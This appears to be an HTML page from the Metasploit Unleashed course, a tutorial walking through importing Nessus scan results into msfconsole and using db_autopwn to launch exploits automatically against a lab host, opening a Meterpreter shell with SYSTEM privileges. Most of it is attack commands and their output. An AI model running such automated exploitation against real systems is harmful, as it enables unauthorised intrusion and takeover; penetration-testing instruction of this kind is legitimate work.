<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Working With Nessus</title>
</head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Working
With Nessus</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">Nessus is a well known and popular
vulnerability scanner that is
free for personal, non-commercial use that was first released in 1998
by Renaurd Deraison and currently published by Tenable Network
Security. There is also a spin off project of Nessus 2, named OpenVAS,
that is published under the GPL. Utilizing a large number of
vulnerability checks, called plugins in Nessus, you can identify a
large number of well known vulnerablities. Metasploit will accept
vulnerability scan result files from both Nessus and OpenVAS in the nbe
file format.
</p>
<p style="color: rgb(0, 0, 0);">Lets walk through the process. First we
complete a scan from Nessus 4:
<br>
<br>
</p>
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:Nessus.png"
 class="image"><img alt="Nessus.png"
 src="http://www.offensive-security.com/w/images/c/cb/Nessus.png"
 width="680" height="578"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
Upon completion of a vulnerability scan, we save the results in nbe
format and then start the msfconsole. Next, we need to create a new
database to read the results file into.
<br>
<br>
</p>
<pre style="color: rgb(0, 0, 0);">root@bt4:/pentest/exploits/framework3# ./msfconsole<br><br>...<br>msf &gt; db_create<br>[*] Creating a new database instance...<br>[*] Successfully connected to the database<br>[*] File: /root/.msf3/sqlite3.db<br>msf &gt; load db_tracker<br>[*] Successfully loaded plugin: db_tracker<br>msf &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We have now created the database.
Next, lets take a look at the 'help' command, which presents many more
options.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre style="color: rgb(0, 0, 0);">msf &gt; help<br><br>...snip...<br><br>Database Backend Commands<br>=========================<br><br>    Command               Description<br>    -------               -----------<br>    db_add_host           Add one or more hosts to the database<br>    db_add_note           Add a note to host<br>    db_add_port           Add a port to host<br>    db_autopwn            Automatically exploit everything<br>    db_connect            Connect to an existing database<br>    db_create             Create a brand new database<br>    db_del_host           Delete one or more hosts from the database<br>    db_del_port           Delete one port from the database<br>    db_destroy            Drop an existing database<br>    db_disconnect         Disconnect from the current database instance<br>    db_driver             Specify a database driver<br>    db_hosts              List all hosts in the database<br>    db_import_amap_mlog   Import a THC-Amap scan results file (-o -m)<br>    db_import_nessus_nbe  Import a Nessus scan result file (NBE)<br>    db_import_nessus_xml  Import a Nessus scan result file (NESSUS)<br>    db_import_nmap_xml    Import a Nmap scan results file (-oX)<br>    db_nmap               Executes nmap and records the output automatically<br>    db_notes              List all notes in the database<br>    db_services           List all services in the database<br>    db_vulns              List all vulnerabilities in the database<br><br>msf &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">So lets go ahead and import the nbe
results file by issuing the
'db_import_nessus_nbe' command followed by the path to our results
file. After importing the results file, we can execute the 'db_hosts'
command to list the hosts that are in the nbe results file.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre style="color: rgb(0, 0, 0);">msf &gt; db_import_nessus_nbe /root/docs/115_scan.nbe<br>msf &gt; db_hosts<br>[*] Time: Tue Jul 14 17:40:23 -0600 2009 Host: 192.168.1.115 Status: alive OS:</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We see exactly what we were
expecting to see. Next we execute the
'db_services' command which will enumerate all of the services that
were detected running on the scanned system.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre style="color: rgb(0, 0, 0);">msf &gt; db_services<br>[*] Time: Tue Jul 14 17:40:23 -0600 2009 Service: host=192.168.1.115 port=135 proto=tcp state=up name=epmap<br>[*] Time: Tue Jul 14 17:40:23 -0600 2009 Service: host=192.168.1.115 port=139 proto=tcp state=up name=netbios-ssn<br>[*] Time: Tue Jul 14 17:40:23 -0600 2009 Service: host=192.168.1.115 port=445 proto=tcp state=up name=microsoft-ds<br>[*] Time: Tue Jul 14 17:40:23 -0600 2009 Service: host=192.168.1.115 port=22 proto=tcp state=up name=ssh<br>[*] Time: Tue Jul 14 17:40:23 -0600 2009 Service: host=192.168.1.115 port=137 proto=udp state=up name=netbios-ns<br>[*] Time: Tue Jul 14 17:40:23 -0600 2009 Service: host=192.168.1.115 port=123 proto=udp state=up name=ntp</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Finally, and most importantly, the
'db_vulns' command will list all
of the vulnerabilities that were reported by Nessus and recorded in the
results file.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre style="color: rgb(0, 0, 0);">msf &gt; db_vulns<br>[*] Time: Tue Jul 14 17:40:23 -0600 2009 Vuln: host=192.168.1.115 port=22 proto=tcp name=NSS-1.3.6.1.4.1.25623.1.0.50282 refs=NSS-1.3.6.1.4.1.25623.1.0.50282<br>[*] Time: Tue Jul 14 17:40:23 -0600 2009 Vuln: host=192.168.1.115 port=445 proto=tcp name=NSS-1.3.6.1.4.1.25623.1.0.11011 refs=NSS-1.3.6.1.4.1.25623.1.0.11011<br>[*] Time: Tue Jul 14 17:40:23 -0600 2009 Vuln: host=192.168.1.115 port=139 proto=tcp name=NSS-1.3.6.1.4.1.25623.1.0.11011 refs=NSS-1.3.6.1.4.1.25623.1.0.11011<br>[*] Time: Tue Jul 14 17:40:23 -0600 2009 Vuln: host=192.168.1.115 port=137 proto=udp name=NSS-1.3.6.1.4.1.25623.1.0.10150 refs=NSS-1.3.6.1.4.1.25623.1.0.10150,CVE-1999-0621<br>[*] Time: Tue Jul 14 17:40:23 -0600 2009 Vuln: host=192.168.1.115 port=445 proto=tcp name=NSS-1.3.6.1.4.1.25623.1.0.10394 refs=NSS-1.3.6.1.4.1.25623.1.0.10394<br>[*] Time: Tue Jul 14 17:40:23 -0600 2009 Vuln: host=192.168.1.115 port=123 proto=udp name=NSS-1.3.6.1.4.1.25623.1.0.10884 refs=NSS-1.3.6.1.4.1.25623.1.0.10884</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">All of this enumeration and parsing
is leading up to
something...db_autopwn. db_autopwn will read all of the ports,
services, and vulnerabilities contained within the nbe results file,
match exploits that are compatible with them, and try to exploit them
all automagically. Running 'db_autopwn -h' will list all of the options
that are available.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre style="color: rgb(0, 0, 0);">msf &gt; db_autopwn -h<br>[*] Usage: db_autopwn [options]<br>-h Display this help text<br>-t Show all matching exploit modules<br>-x Select modules based on vulnerability references<br>-p Select modules based on open ports<br>-e Launch exploits against all matched targets<br>-r Use a reverse connect shell<br>-b Use a bind shell on a random port<br>-q Disable exploit module output<br>-I [range] Only exploit hosts inside this range<br>-X [range] Always exclude hosts inside this range<br>-PI [range] Only exploit hosts with these ports open<br>-PX [range] Always exclude hosts with these ports open<br>-m [regex] Only run modules whose name matches the regex</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We will run 'db_autopwn -x -e' to
select exploit modules based on
vulnerability (instead of just by port as would happen with just nmap
results) and exploit all targets. db_autopwn is not a stealthy tool by
any means and by default, uses a reverse Meterpreter shell. Lets see
what happens when we run it.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre style="color: rgb(0, 0, 0);">msf &gt; db_autopwn -x -e<br>[*] (8/38): Launching exploit/multi/samba/nttrans against 192.168.1.115:139...<br>[*] (9/38): Launching exploit/windows/smb/psexec against 192.168.1.115:445...<br>[*] (10/38): Launching exploit/windows/smb/ms06_066_nwwks against 192.168.1.115:445...<br><br>[-] Exploit failed: The connection was refused by the remote host (192.168.1.115:22).<br>[*] (35/38): Launching exploit/windows/smb/ms03_049_netapi against 192.168.1.115:445...<br>[*] Started bind handler<br>[-] Exploit failed: No encoders encoded the buffer successfully.<br>msf &gt;<br>[*] Binding to 3d742890-397c-11cf-9bf1-00805f88cb72:1.0@ncacn_np:192.168.1.115[alert] ...<br>[*] Binding to 3919286a-b10c-11d0-9ba8-00c04fd92ef5:0.0@ncacn_np:192.168.1.115[lsarpc]...<br>[-] Exploit failed: The server responded with error: STATUS_ACCESS_DENIED (Command=162 WordCount=0)<br>[-] Exploit failed: The server responded with error: STATUS_ACCESS_DENIED (Command=162 WordCount=0)<br>[*] Transmitting intermediate stager for over-sized stage...(216 bytes)<br>[*] Sending stage (718336 bytes)<br>[*] Meterpreter session 1 opened (192.168.1.101:40814 -&gt; 192.168.1.115:14198)</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Very nice! db_autopwn has
successfully exploited the host and has a
Meterpreter shell waiting for us. The 'sessions -l' command will list
the open sessions available while 'sessions -i ' will allow us to
interact with that session ID.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre style="color: rgb(0, 0, 0);">msf &gt; sessions -l<br><br>Active sessions<br>===============<br><br>Id Description Tunnel<br>-- ----------- ------<br>1  Meterpreter 192.168.1.101:40814 -&gt; 192.168.1.115:14198<br><br>msf &gt; sessions -i 1<br>[*] Starting interaction with 1...<br><br><u>meterpreter</u> &gt; sysinfo<br>Computer: DOOKIE-FA154354<br>OS : Windows XP (Build 2600, Service Pack 2).<br><u>meterpreter</u> &gt; getuid<br>Server username: NT AUTHORITY\SYSTEM</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">As you can see, this is a very
powerful feature. It won't catch
everything on the remote system, and will be very noisy, but there is a
time and place for noise the same as there is for stealth. This
demonstrates the versatility of the framework, and some of the many
possibilities for integration with other tools that are possible. </span><br
 style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Vulnerability_Scanning"
 title="Vulnerability Scanning">Vulnerability Scanning</a></div>
<p style="color: rgb(0, 0, 0);"><br>
</p>
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Nessus_Via_Msfconsole"
 title="Nessus Via Msfconsole">Nessus via msfconsole</a></div>
</body>
</html>
